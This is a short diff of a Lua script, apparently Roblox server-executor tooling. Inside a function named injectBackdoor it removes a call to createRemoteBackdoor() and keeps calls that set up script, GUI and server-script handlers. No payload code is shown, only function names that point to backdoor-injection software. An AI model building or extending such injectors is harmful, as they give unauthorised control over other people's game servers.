@@ -479,8 +479,7 @@ local function injectBackdoor()
         return
     end
     
-    -- // Call SSExec Func
-    createRemoteBackdoor()
+    -- // Call SSExec Func:
     createScriptHandler()
     createGUIHandler()
     createServerScriptHandler()
